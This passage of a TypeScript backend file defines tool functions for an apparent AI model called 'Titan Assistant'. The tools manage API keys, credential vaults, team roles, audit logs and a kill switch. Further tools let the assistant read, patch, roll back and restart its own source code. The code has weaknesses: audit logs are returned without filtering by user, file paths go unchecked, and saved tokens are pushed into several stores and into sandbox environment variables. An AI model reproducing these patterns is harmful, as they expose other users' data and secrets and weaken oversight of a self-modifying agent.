    return { success: false, error: "Maximum of 10 active API keys. Revoke an existing key first." };
  }

  const raw = `at_${crypto.randomBytes(32).toString("hex")}`;
  const prefix = raw.substring(0, 11);
  const hash = crypto.createHash("sha256").update(raw).digest("hex");
  const expiresAt = args.expiresInDays
    ? new Date(Date.now() + args.expiresInDays * 24 * 60 * 60 * 1000)
    : null;

  await db.insert(apiKeys).values({
    userId,
    name: args.name,
    keyPrefix: prefix,
    keyHash: hash,
    scopes: args.scopes,
    expiresAt,
  });

  await logAudit({
    userId,
    userName: userName || undefined,
    userEmail: userEmail || undefined,
    action: "apiKey.create",
    resource: "apiKey",
    details: { name: args.name, scopes: args.scopes, source: "titan_assistant" },
  });

  return {
    success: true,
    data: {
      key: raw,
      prefix,
      name: args.name,
      scopes: args.scopes,
      expiresAt,
      warning: "This is the only time the full key will be shown. Save it securely.",
    },
  };
}

async function execRevokeApiKey(
  userId: number,
  keyId: number,
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  await db
    .update(apiKeys)
    .set({ revokedAt: new Date() })
    .where(and(eq(apiKeys.id, keyId), eq(apiKeys.userId, userId)));

  await logAudit({
    userId,
    userName: userName || undefined,
    userEmail: userEmail || undefined,
    action: "apiKey.revoke",
    resource: "apiKey",
    resourceId: keyId.toString(),
    details: { source: "titan_assistant" },
  });

  return { success: true, data: { message: `API key #${keyId} has been revoked.` } };
}

async function execStartLeakScan(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  // Create a new scan record
  const scanId = crypto.randomUUID();
  await db.insert(leakScans).values({
    userId,
    status: "scanning",
  });

  return {
    success: true,
    data: {
      message: "Leak scan started. It will check your stored credentials against known breach databases and public code repositories.",
      tip: "Check results with get_leak_scan_results or visit the Leak Scanner page.",
    },
  };
}

async function execGetLeakScanResults(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const scans = await db
    .select()
    .from(leakScans)
    .where(eq(leakScans.userId, userId))
    .orderBy(desc(leakScans.createdAt))
    .limit(5);

  if (scans.length === 0) {
    return { success: true, data: { message: "No leak scans found. Use start_leak_scan to run one." } };
  }

  const latestScan = scans[0];
  const findings = await db
    .select()
    .from(leakFindings)
    .where(eq(leakFindings.scanId, latestScan.id))
    .orderBy(desc(leakFindings.createdAt));

  return {
    success: true,
    data: {
      latestScan: {
        id: latestScan.id,
        status: latestScan.status,
        sourcesScanned: latestScan.sourcesScanned,
        leaksFound: latestScan.leaksFound,
        createdAt: latestScan.createdAt,
      },
      findings: findings.map((f: any) => ({
        id: f.id,
        severity: f.severity,
        source: f.source,
        description: f.description,
        status: f.status,
        credentialId: f.credentialId,
      })),
      totalScans: scans.length,
    },
  };
}

async function execListVaultEntries(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const items = await db
    .select({
      id: vaultItems.id,
      name: vaultItems.name,
      credentialType: vaultItems.credentialType,
      createdByUserId: vaultItems.createdByUserId,
      notes: vaultItems.notes,
      createdAt: vaultItems.createdAt,
      updatedAt: vaultItems.updatedAt,
    })
    .from(vaultItems)
    .where(eq(vaultItems.teamOwnerId, userId))
    .orderBy(desc(vaultItems.createdAt));

  return {
    success: true,
    data: {
      count: items.length,
      entries: items,
    },
  };
}

async function execAddVaultEntry(
  userId: number,
  args: { name: string; value: string; category?: string; notes?: string },
  userName?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const encryptedValue = encrypt(args.value);

  await db.insert(vaultItems).values({
    teamOwnerId: userId,
    createdByUserId: userId,
    name: args.name,
    encryptedValue,
    credentialType: args.category || "other",
    notes: args.notes || null,
  });

  return {
    success: true,
    data: {
      message: `Vault entry "${args.name}" created successfully.`,
      category: args.category || "other",
    },
  };
}

async function execSaveCredential(
  userId: number,
  args: { providerId: string; providerName: string; keyType: string; value: string; label?: string },
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  if (!args.value || !args.value.trim()) {
    return { success: false, error: "Credential value cannot be empty" };
  }
  if (!args.providerId || !args.providerName || !args.keyType) {
    return { success: false, error: "Provider ID, provider name, and key type are required" };
  }

  const trimmedValue = args.value.trim();
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  try {
    // ── Map provider IDs to userSecrets secretType ──────────────────
    // This ensures every token is stored in userSecrets so ALL systems
    // (Builder, Deploy, Replicate, etc.) can find them.
    const secretTypeMap: Record<string, string> = {
      github: "github_pat",
      openai: "openai_api_key",
      anthropic: "anthropic_api_key",
      stripe: "stripe_secret_key",
      sendgrid: "gmail_user",
      gmail: "gmail_user",
      twilio: "twilio_auth_token",
      aws: "aws_access_key",
      cloudflare: "cloudflare_api_token",
      heroku: "heroku_api_key",
      digitalocean: "digitalocean_api_token",
      firebase: "firebase_api_key",
      google_cloud: "google_cloud_api_key",
      huggingface: "huggingface_api_token",
      discord: "discord_bot_token",
      slack: "slack_bot_token",
      vercel: "vercel_api_token",
      netlify: "netlify_api_token",
      railway: "railway_api_token",
      supabase: "supabase_api_key",
      replicate: "replicate_api_token",
      // Marketing channels (vault-bridge compatible)
      devto: "devto_api_key",
      hashnode: "hashnode_api_key",
      medium: "medium_access_token",
      telegram: "telegram_bot_token",
      mastodon: "mastodon_access_token",
      tiktok: "tiktok_access_token",
      pinterest: "pinterest_access_token",
      meta: "meta_access_token",
      google_ads: "google_ads_dev_token",
      whatsapp: "whatsapp_access_token",
      youtube: "youtube_api_key",
      skool: "skool_api_key",
      reddit: "reddit_client_id",
      linkedin: "linkedin_access_token",
      x: "x_api_key",
      twitter: "x_api_key",
      snapchat: "snapchat_access_token",
      indiehackers: "indiehackers_username",
    };

    let validationMessage = "";
    let maskedValue = trimmedValue.length > 8
      ? `${trimmedValue.slice(0, 4)}...${trimmedValue.slice(-4)}`
      : "****";

    // ── Special handling: GitHub PAT validation ─────────────────────
    if (args.providerId === "github" || trimmedValue.startsWith("ghp_") || trimmedValue.startsWith("github_pat_")) {
      try {
        const testResp = await fetch("https://api.github.com/user", {
          headers: { Authorization: `token ${trimmedValue}`, "User-Agent": "ArchibaldTitan" },
          signal: AbortSignal.timeout(10000),
        });
        if (testResp.ok) {
          const userData = await testResp.json() as any;
          const ghUsername = userData.login || "unknown";
          maskedValue = `ghp_...${trimmedValue.slice(-4)} (${ghUsername})`;
          validationMessage = ` Validated against GitHub API — connected as @${ghUsername}.`;
        } else {
          validationMessage = ` Warning: GitHub returned ${testResp.status} — token may be invalid or expired. Saved anyway.`;
        }
      } catch {
        validationMessage = " Could not validate against GitHub API — saved anyway.";
      }
      // Force correct provider ID for GitHub tokens
      args.providerId = "github";
      args.providerName = "GitHub";
      args.keyType = "personal_access_token";
    }

    // ── Special handling: OpenAI key validation ─────────────────────
    if (args.providerId === "openai" || trimmedValue.startsWith("sk-")) {
      validationMessage = validationMessage || " OpenAI key detected.";
      args.providerId = args.providerId || "openai";
      args.providerName = args.providerName || "OpenAI";
      args.keyType = args.keyType || "api_key";
    }

    // ── 1. Save to userSecrets (primary vault — used by Builder, Deploy, etc.) ──
    const secretType = secretTypeMap[args.providerId] || `${args.providerId}_${args.keyType}`;
    const encryptedValue = encrypt(trimmedValue);
    const label = args.label || `${args.providerName} ${args.keyType} (via chat)`;
    const displayLabel = maskedValue || label;
    let savedToUserSecrets = false;

    try {
      const existing = await db
        .select({ id: userSecrets.id })
        .from(userSecrets)
        .where(
          and(
            eq(userSecrets.userId, userId),
            eq(userSecrets.secretType, secretType)
          )
        )
        .limit(1);

      if (existing.length > 0) {
        // Don't set updatedAt — MySQL ON UPDATE CURRENT_TIMESTAMP handles it
        await db
          .update(userSecrets)
          .set({ encryptedValue, label: displayLabel })
          .where(eq(userSecrets.id, existing[0].id));
      } else {
        await db.insert(userSecrets).values({
          userId,
          secretType,
          encryptedValue,
          label: displayLabel,
        });
      }
      savedToUserSecrets = true;
    } catch (secretErr: unknown) {
      // If drizzle ORM fails, try raw SQL as fallback
      try {
        await db.execute(
          sql`INSERT INTO user_secrets (userId, secretType, encryptedValue, label)
              VALUES (${userId}, ${secretType}, ${encryptedValue}, ${displayLabel})
              ON DUPLICATE KEY UPDATE encryptedValue = VALUES(encryptedValue), label = VALUES(label)`
        );
        savedToUserSecrets = true;
      } catch {
        // Log but don't fail — we'll try fetcher credentials next
        console.error("[save_credential] userSecrets save failed:", getErrorMessage(secretErr));
      }
    }

    // ── 2. Also save to fetcher credentials (for the Fetcher system) ──
    let savedToFetcher = false;
    try {
      await storeManualCredential(
        userId,
        args.providerId,
        args.providerName,
        args.keyType,
        trimmedValue,
        args.label,
      );
      savedToFetcher = true;
    } catch {
      // Fetcher credential storage is best-effort
    }

    // At least one vault must succeed
    if (!savedToUserSecrets && !savedToFetcher) {
      return { success: false, error: "Failed to save credential to any vault. Please try again or save manually at /fetcher/credentials." };
    }

    // ── Audit log ──────────────────────────────────────────────────
    try {
      await logAudit({
        userId,
        action: "credential.manual_save",
        resource: `${args.providerName} (${args.keyType})`,
        details: { method: "chat", provider: args.providerName, keyType: args.keyType, secretType, label: label, savedToUserSecrets, savedToFetcher },
        ipAddress: "chat",
        userAgent: "Titan Assistant",
      });
    } catch { /* audit logging is best-effort */ }

    const storedIn: string[] = [];
    if (savedToUserSecrets) storedIn.push("System Vault (Builder/Deploy/System)");
    if (savedToFetcher) storedIn.push("Fetcher Vault");

    // ── 3. Refresh vault bridge so marketing channels pick up the new token immediately ──
    let vaultBridgeRefreshed = false;
    try {
      const bridgeResult = await runVaultBridge(true); // force=true to pick up the new token
      vaultBridgeRefreshed = bridgeResult.patched.length > 0;
      if (vaultBridgeRefreshed) {
        storedIn.push(`Vault Bridge (patched ${bridgeResult.patched.join(", ")} into ENV)`);
      }
    } catch { /* vault bridge is best-effort */ }

    // ── 4. Inject into sandbox env vars so sandbox_exec commands can use the token directly ──
    // Map secretType → ENV var name for tokens that are useful in the sandbox
    const sandboxEnvMap: Record<string, string> = {
      expo_token: "EXPO_TOKEN",
      openai_api_key: "OPENAI_API_KEY",
      anthropic_api_key: "ANTHROPIC_API_KEY",
      github_pat: "GITHUB_TOKEN",
      replicate_api_token: "REPLICATE_API_TOKEN",
      huggingface_api_token: "HUGGINGFACE_TOKEN",
    };
    const sandboxEnvKey = sandboxEnvMap[secretType];
    if (sandboxEnvKey && savedToUserSecrets) {
      try {
        // Find or create the user's default sandbox and inject the env var
        const existingSandboxes = await listSandboxes(userId);
        if (existingSandboxes.length > 0) {
          await sandboxUpdateEnvVars(existingSandboxes[0].id, userId, { [sandboxEnvKey]: trimmedValue });
          storedIn.push(`Sandbox ENV (${sandboxEnvKey} available in sandbox_exec)`);
        }
      } catch { /* sandbox env injection is best-effort */ }
    }

    return {
      success: true,
      data: {
        message: `Credential saved successfully! Your ${args.providerName} ${args.keyType} has been encrypted with AES-256-GCM and stored securely.${validationMessage}`,
        provider: args.providerName,
        keyType: args.keyType,
        secretType,
        label: displayLabel,
        storedIn,
        tip: "I can now access this token for any operation that needs it — Builder, Deploy, Fetcher, etc. You can also view your credentials at /fetcher/credentials or /account.",
        vaultBridgeRefreshed,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Failed to save credential: ${getErrorMessage(err)}` };
  }
}

async function execTriggerBulkSync(userId: number, providerIds?: string[]): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const providers = providerIds || Object.keys(PROVIDERS);
  const providerNames = providers.map((id) => PROVIDERS[id]?.name || id);

  await db.insert(bulkSyncJobs).values({
    userId,
    status: "queued",
    totalProviders: providers.length,
    completedProviders: 0,
    failedProviders: 0,
  });

  return {
    success: true,
    data: {
      message: `Bulk sync triggered for ${providers.length} providers: ${providerNames.join(", ")}.`,
      tip: "Note: Bulk sync requires saved provider credentials. Check status with get_bulk_sync_status.",
    },
  };
}

async function execGetBulkSyncStatus(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const jobs = await db
    .select()
    .from(bulkSyncJobs)
    .where(eq(bulkSyncJobs.userId, userId))
    .orderBy(desc(bulkSyncJobs.createdAt))
    .limit(5);

  return {
    success: true,
    data: {
      count: jobs.length,
      jobs: jobs.map((j) => ({
        id: j.id,
        status: j.status,
        totalProviders: j.totalProviders,
        completedProviders: j.completedProviders,
        failedProviders: j.failedProviders,
        createdAt: j.createdAt,
      })),
    },
  };
}

async function execListTeamMembers(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const members = await db
    .select({
      id: teamMembers.id,
      userId: teamMembers.userId,
      role: teamMembers.role,
      inviteEmail: teamMembers.inviteEmail,
      inviteStatus: teamMembers.inviteStatus,
      joinedAt: teamMembers.joinedAt,
      createdAt: teamMembers.createdAt,
      userName: users.name,
      userEmail: users.email,
    })
    .from(teamMembers)
    .leftJoin(users, eq(teamMembers.userId, users.id))
    .where(eq(teamMembers.teamOwnerId, userId))
    .orderBy(desc(teamMembers.createdAt));

  return {
    success: true,
    data: {
      count: members.length,
      members: members.map((m) => ({
        id: m.id,
        name: m.userName || m.inviteEmail || "Unknown",
        email: m.userEmail || m.inviteEmail,
        role: m.role,
        status: m.inviteStatus,
        joinedAt: m.joinedAt,
      })),
    },
  };
}

async function execAddTeamMember(
  userId: number,
  args: { email: string; role?: string },
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  // Find user by email
  const targetUser = await db
    .select()
    .from(users)
    .where(eq(users.email, args.email))
    .limit(1);

  if (targetUser.length === 0) {
    return { success: false, error: `No user found with email "${args.email}". They must sign up first.` };
  }

  const target = targetUser[0];
  if (target.id === userId) {
    return { success: false, error: "You cannot add yourself to your team." };
  }

  // Check if already a member
  const existing = await db
    .select()
    .from(teamMembers)
    .where(and(eq(teamMembers.teamOwnerId, userId), eq(teamMembers.userId, target.id)))
    .limit(1);

  if (existing.length > 0) {
    return { success: false, error: "This user is already a team member." };
  }

  const role = (args.role || "member") as "admin" | "member" | "viewer";
  await db.insert(teamMembers).values({
    teamOwnerId: userId,
    userId: target.id,
    role,
    invitedByUserId: userId,
    inviteEmail: args.email,
    inviteStatus: "accepted",
  });

  await logAudit({
    userId,
    userName: userName || undefined,
    userEmail: userEmail || undefined,
    action: "team.addMember",
    resource: "teamMember",
    details: { email: args.email, role, source: "titan_assistant" },
  });

  return {
    success: true,
    data: { message: `${target.name || args.email} added to team as ${role}.` },
  };
}

async function execRemoveTeamMember(
  userId: number,
  memberId: number,
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const member = await db
    .select()
    .from(teamMembers)
    .where(and(eq(teamMembers.id, memberId), eq(teamMembers.teamOwnerId, userId)))
    .limit(1);

  if (member.length === 0) {
    return { success: false, error: "Team member not found." };
  }

  await db
    .delete(teamMembers)
    .where(and(eq(teamMembers.id, memberId), eq(teamMembers.teamOwnerId, userId)));

  await logAudit({
    userId,
    userName: userName || undefined,
    userEmail: userEmail || undefined,
    action: "team.removeMember",
    resource: "teamMember",
    resourceId: memberId.toString(),
    details: { source: "titan_assistant" },
  });

  return { success: true, data: { message: `Team member #${memberId} removed.` } };
}

async function execUpdateTeamMemberRole(
  userId: number,
  args: { memberId: number; role: string },
  userName?: string,
  userEmail?: string
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const newRole = args.role as "admin" | "member" | "viewer";
  await db
    .update(teamMembers)
    .set({ role: newRole })
    .where(and(eq(teamMembers.id, args.memberId), eq(teamMembers.teamOwnerId, userId)));

  await logAudit({
    userId,
    userName: userName || undefined,
    userEmail: userEmail || undefined,
    action: "team.updateRole",
    resource: "teamMember",
    resourceId: args.memberId.toString(),
    details: { newRole: args.role, source: "titan_assistant" },
  });

  return { success: true, data: { message: `Team member #${args.memberId} role updated to ${args.role}.` } };
}

async function execListSchedules(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const schedules = await db
    .select()
    .from(syncSchedules)
    .where(eq(syncSchedules.userId, userId))
    .orderBy(desc(syncSchedules.createdAt));

  return {
    success: true,
    data: {
      count: schedules.length,
      schedules: schedules.map((s: any) => ({
        id: s.id,
        name: s.name,
        frequency: s.frequency,
        providerIds: s.providerIds,
        enabled: s.enabled,
        lastRunAt: s.lastRunAt,
        nextRunAt: s.nextRunAt,
        createdAt: s.createdAt,
      })),
    },
  };
}

async function execCreateSchedule(
  userId: number,
  args: { name: string; providerIds: string[]; frequency: string }
): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  // Calculate next run
  const frequencyMs: Record<string, number> = {
    daily: 24 * 60 * 60 * 1000,
    weekly: 7 * 24 * 60 * 60 * 1000,
    biweekly: 14 * 24 * 60 * 60 * 1000,
    monthly: 30 * 24 * 60 * 60 * 1000,
  };

  const freq = args.frequency as "daily" | "weekly" | "biweekly" | "monthly";
  const nextRunAt = new Date(Date.now() + (frequencyMs[freq] || frequencyMs.daily));

  await db.insert(syncSchedules).values({
    userId,
    name: args.name,
    frequency: freq,
    providerIds: args.providerIds,
    timeOfDay: "09:00",
    enabled: 1,
    nextRunAt,
  });

  return {
    success: true,
    data: {
      message: `Schedule "${args.name}" created. Will run ${args.frequency} for ${args.providerIds.length} providers.`,
      nextRunAt,
    },
  };
}

async function execDeleteSchedule(userId: number, scheduleId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  await db
    .delete(syncSchedules)
    .where(and(eq(syncSchedules.id, scheduleId), eq(syncSchedules.userId, userId)));

  return { success: true, data: { message: `Schedule #${scheduleId} deleted.` } };
}

async function execGetWatchdogSummary(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const watches = await db
    .select()
    .from(credentialWatches)
    .where(eq(credentialWatches.userId, userId));

  const now = new Date();
  const expiringSoon = watches.filter((w) => {
    const daysUntil = Math.ceil(
      (new Date(w.expiresAt).getTime() - now.getTime()) / (24 * 60 * 60 * 1000)
    );
    return daysUntil > 0 && daysUntil <= w.alertDaysBefore;
  });
  const expired = watches.filter((w) => new Date(w.expiresAt).getTime() <= now.getTime());
  const healthy = watches.filter((w) => {
    const daysUntil = Math.ceil(
      (new Date(w.expiresAt).getTime() - now.getTime()) / (24 * 60 * 60 * 1000)
    );
    return daysUntil > w.alertDaysBefore;
  });

  return {
    success: true,
    data: {
      totalWatches: watches.length,
      healthy: healthy.length,
      expiringSoon: expiringSoon.length,
      expired: expired.length,
      details: expiringSoon.map((w) => ({
        id: w.id,
        credentialId: w.credentialId,
        expiresAt: w.expiresAt,
        daysRemaining: Math.ceil(
          (new Date(w.expiresAt).getTime() - now.getTime()) / (24 * 60 * 60 * 1000)
        ),
      })),
    },
  };
}

async function execCheckProviderHealth(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const snapshots = await db
    .select()
    .from(providerHealthSnapshots)
    .where(eq(providerHealthSnapshots.userId, userId))
    .orderBy(desc(providerHealthSnapshots.createdAt));

  // Group by provider, take latest
  const providerMap = new Map<string, any>();
  for (const s of snapshots) {
    if (!providerMap.has(s.providerId)) {
      providerMap.set(s.providerId, s);
    }
  }

  const providers = Array.from(providerMap.values()).map((s: any) => ({
    providerId: s.providerId,
    name: PROVIDERS[s.providerId]?.name || s.providerId,
    status: s.status,
    successRate: s.successRate,
    avgResponseTime: s.avgResponseTime,
    lastChecked: s.createdAt,
  }));

  return {
    success: true,
    data: {
      totalProviders: providers.length,
      online: providers.filter((p) => p.status === "online").length,
      degraded: providers.filter((p) => p.status === "degraded").length,
      offline: providers.filter((p) => p.status === "offline").length,
      providers,
    },
  };
}

async function execGetRecommendations(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const recs = await db
    .select()
    .from(fetchRecommendations)
    .where(and(eq(fetchRecommendations.userId, userId), eq(fetchRecommendations.dismissed, 0)))
    .orderBy(desc(fetchRecommendations.createdAt))
    .limit(10);

  return {
    success: true,
    data: {
      count: recs.length,
      recommendations: recs.map((r: any) => ({
        id: r.id,
        type: r.type,
        title: r.title,
        description: r.description,
        priority: r.priority,
        actionLabel: r.actionLabel,
      })),
    },
  };
}

async function execGetAuditLogs(args: { action?: string; limit?: number }): Promise<ToolExecutionResult> {
  const result = await queryAuditLogs({
    action: args.action,
    limit: args.limit || 20,
    offset: 0,
  });

  return {
    success: true,
    data: {
      total: result.total,
      entries: result.logs.map((l: any) => ({
        id: l.id,
        action: l.action,
        resource: l.resource,
        resourceId: l.resourceId,
        userName: l.userName,
        userEmail: l.userEmail,
        details: l.details,
        createdAt: l.createdAt,
      })),
    },
  };
}

async function execActivateKillSwitch(userId: number, code: string): Promise<ToolExecutionResult> {
  const success = await activateKS(userId, code);
  if (success) {
    return {
      success: true,
      data: { message: "KILL SWITCH ACTIVATED. All running jobs and automations have been halted immediately." },
    };
  }
  return { success: false, error: "Invalid kill switch code. Please check your code and try again." };
}

async function execGetSystemStatus(userId: number): Promise<ToolExecutionResult> {
  const db = await getDb();
  if (!db) return { success: false, error: "Database unavailable" };

  const plan = await getUserPlan(userId);

  // Credential count
  const creds = await db
    .select({ count: sql<number>`COUNT(*)` })
    .from(fetcherCredentials)
    .where(eq(fetcherCredentials.userId, userId));

  // Job count
  const jobs = await db
    .select({ count: sql<number>`COUNT(*)` })
    .from(fetcherJobs)
    .where(eq(fetcherJobs.userId, userId));

  // Proxy count
  const proxies = await db
    .select({
      total: sql<number>`COUNT(*)`,
      healthy: sql<number>`SUM(CASE WHEN healthy = 1 THEN 1 ELSE 0 END)`,
    })
    .from(fetcherProxies)
    .where(eq(fetcherProxies.userId, userId));

  // Watchdog
  const watches = await db
    .select({ count: sql<number>`COUNT(*)` })
    .from(credentialWatches)
    .where(eq(credentialWatches.userId, userId));

  // API keys
  const keys = await db
    .select({ count: sql<number>`COUNT(*)` })
    .from(apiKeys)
    .where(and(eq(apiKeys.userId, userId), isNull(apiKeys.revokedAt)));

  // ─── Autonomous Systems Status ──────────────────────────────────
  let autonomousStatus = null;
  try {
    const { getAutonomousSystemStatus } = await import("./autonomous-sync");
    autonomousStatus = await getAutonomousSystemStatus();
  } catch {
    // Non-critical — module may not be loaded yet
  }

  return {
    success: true,
    data: {
      plan: { id: plan.planId, name: plan.tier.name, status: plan.status },
      credentials: creds[0].count,
      totalJobs: jobs[0].count,
      proxies: { total: proxies[0].total, healthy: proxies[0].healthy || 0 },
      watchdogAlerts: watches[0].count,
      activeApiKeys: keys[0].count,
      autonomousSystems: autonomousStatus ? {
        summary: autonomousStatus.summary,
        systems: autonomousStatus.systems.map((s: any) => ({
          name: s.name,
          category: s.category,
          status: s.status,
          schedule: s.schedule,
          reason: s.reason,
        })),
        channels: autonomousStatus.channels.map((c: any) => ({
          channel: c.channel,
          configured: c.configured,
          impact: c.impact,
          freeToSetup: c.freeToSetup,
          envVars: c.envVars,
          setupUrl: c.setupUrl,
        })),
        recommendations: autonomousStatus.recommendations,
      } : "Autonomous sync module not loaded yet",
    },
  };
}

async function execGetPlanUsage(userId: number): Promise<ToolExecutionResult> {
  const plan = await getUserPlan(userId);
  return {
    success: true,
    data: {
      planId: plan.planId,
      planName: plan.tier.name,
      status: plan.status,
      isActive: plan.isActive,
      limits: plan.tier.limits,
      features: plan.tier.features,
    },
  };
}


// ─── Self-Improvement Executor Functions ─────────────────────────────

function execSelfReadFile(filePath: string): ToolExecutionResult {
  if (!filePath) return { success: false, error: "filePath is required" };
  const result = selfReadFileImpl(filePath);
  if (!result.success) return { success: false, error: result.error };
  return {
    success: true,
    data: {
      filePath,
      content: result.content,
      length: result.content?.length || 0,
    },
  };
}

function execSelfListFiles(dirPath: string): ToolExecutionResult {
  if (!dirPath) return { success: false, error: "dirPath is required" };
  const result = selfListFilesImpl(dirPath);
  if (!result.success) return { success: false, error: result.error };
  return {
    success: true,
    data: {
      directory: dirPath,
      files: result.files,
      count: result.files?.length || 0,
    },
  };
}

async function execSelfModifyFile(
  userId: number,
  args: { filePath: string; action: "modify" | "create" | "delete" | "patch"; content?: string; patches?: Array<{ search: string; replace: string }>; description: string },
  userName?: string
): Promise<ToolExecutionResult> {
  if (!args.filePath || !args.action || !args.description) {
    return { success: false, error: "filePath, action, and description are required" };
  }

  // Handle patch action — apply search-and-replace patches to existing file
  if (args.action === "patch") {
    if (!args.patches || args.patches.length === 0) {
      return { success: false, error: "patches array is required for patch action. Each patch needs {search, replace}." };
    }
    // Read the current file content
    const fs = await import("fs");
    const path = await import("path");
    const fullPath = path.join(process.cwd(), args.filePath);
    if (!fs.existsSync(fullPath)) {
      return { success: false, error: `File not found: ${args.filePath}. Use 'create' action for new files.` };
    }
    let content = fs.readFileSync(fullPath, "utf-8");
    const patchResults: string[] = [];

    // Helper: normalize whitespace for fuzzy matching
    const normalizeWS = (s: string) => s.replace(/\r\n/g, "\n").replace(/[ \t]+/g, " ").replace(/\n\s*\n/g, "\n").trim();

    // Helper: try to find the search text with flexible whitespace matching
    const fuzzyFind = (haystack: string, needle: string): { start: number; end: number } | null => {
      // 1. Exact match first
      const exactIdx = haystack.indexOf(needle);
      if (exactIdx !== -1) return { start: exactIdx, end: exactIdx + needle.length };

      // 2. Try trimmed match (LLM often adds/removes leading/trailing whitespace)
      const trimmedNeedle = needle.trim();
      const trimmedIdx = haystack.indexOf(trimmedNeedle);
      if (trimmedIdx !== -1) return { start: trimmedIdx, end: trimmedIdx + trimmedNeedle.length };

      // 3. Try normalized whitespace match
      const normHaystack = normalizeWS(haystack);
      const normNeedle = normalizeWS(needle);
      const normIdx = normHaystack.indexOf(normNeedle);
      if (normIdx !== -1) {
        // Map back to original positions by finding the closest match
        // Search for the first line of the needle in the original
        const firstLine = needle.trim().split("\n")[0].trim();
        const lineIdx = haystack.indexOf(firstLine);
        if (lineIdx !== -1) {
          // Find the last line to determine the end
          const lastLine = needle.trim().split("\n").pop()?.trim() || firstLine;
          const lastLineIdx = haystack.indexOf(lastLine, lineIdx);
          if (lastLineIdx !== -1) {
            return { start: lineIdx, end: lastLineIdx + lastLine.length };
          }
          return { start: lineIdx, end: lineIdx + firstLine.length };
        }
      }

      // 4. Try matching just the first significant line (for single-line searches like tag names)
      const significantLines = needle.trim().split("\n").map(l => l.trim()).filter(l => l.length > 3);
      if (significantLines.length === 1) {
        const singleIdx = haystack.indexOf(significantLines[0]);
        if (singleIdx !== -1) return { start: singleIdx, end: singleIdx + significantLines[0].length };
      }

      return null;
    };

    for (let i = 0; i < args.patches.length; i++) {
      const patch = args.patches[i];
      const match = fuzzyFind(content, patch.search);
      if (!match) {
        patchResults.push(`Patch ${i + 1}: FAILED — search text not found in file. Make sure the search text matches exactly (including whitespace).`);
        continue;
      }
      // Replace the matched region with the replacement text
      content = content.substring(0, match.start) + patch.replace + content.substring(match.end);
      patchResults.push(`Patch ${i + 1}: Applied successfully`);
    }
    const failedPatches = patchResults.filter(r => r.includes("FAILED"));
    if (failedPatches.length === args.patches.length) {
      return { success: false, error: `All ${args.patches.length} patches failed:\n${patchResults.join("\n")}` };
    }
    // Now apply the patched content as a modify action
    args.action = "modify";
    args.content = content;
  }

  if ((args.action === "modify" || args.action === "create") && !args.content) {
    return { success: false, error: "content is required for modify/create actions" };
  }

  const result = await applyModificationsDeferred(
    [
      {
        filePath: args.filePath,
        action: args.action as "modify" | "create" | "delete",
        content: args.content,
        description: args.description,
      },
    ],
    userId,
    userName || "titan_assistant"
  );

  if (!result.success) {
    return {
      success: false,
      error: result.error,
      data: {
        validationErrors: result.validationResult?.errors,
        validationWarnings: result.validationResult?.warnings,
        rolledBack: result.rolledBack,
        healthCheckPassed: result.healthCheckPassed,
      },
    };
  }

  return {
    success: true,
    data: {
      snapshotId: result.snapshotId,
      modifications: result.modifications,
      healthCheckPassed: result.healthCheckPassed,
      message: `Successfully ${args.action === "create" ? "created" : args.action === "delete" ? "deleted" : "modified"} ${args.filePath}. Snapshot #${result.snapshotId} saved for rollback if needed.`,
    },
  };
}

async function execSelfHealthCheck(options?: {
  skipTests?: boolean;
  skipTypeCheck?: boolean;
}): Promise<ToolExecutionResult> {
  const health = await runQuickHealthCheck(options);
  return {
    success: true,
    data: {
      healthy: health.healthy,
      checks: health.checks,
      summary: health.healthy
        ? "All systems operational"
        : `${health.checks.filter((c) => !c.passed).length} issue(s) detected`,
    },
  };
}

async function execSelfRollback(
  userId: number,
  snapshotId?: number,
  userName?: string
): Promise<ToolExecutionResult> {
  if (snapshotId) {
    const result = await rollbackToSnapshot(snapshotId);
    return {
      success: result.success,
      data: {
        snapshotId,
        filesRestored: result.filesRestored,
        message: result.success
          ? `Rolled back to snapshot #${snapshotId}. ${result.filesRestored} file(s) restored.`
          : undefined,
      },
      error: result.error,
    };
  }

  // Roll back to last known good
  const result = await rollbackToLastGood();
  return {
    success: result.success,
    data: {
      snapshotId: result.snapshotId,
      filesRestored: result.filesRestored,
      message: result.success
        ? `Rolled back to last known good snapshot #${result.snapshotId}. ${result.filesRestored} file(s) restored.`
        : undefined,
    },
    error: result.error,
  };
}

async function execSelfRestart(
  userId: number,
  reason: string
): Promise<ToolExecutionResult> {
  if (!reason) {
    return { success: false, error: "A reason for the restart is required" };
  }

  // In deferred mode, stage the restart for after flush
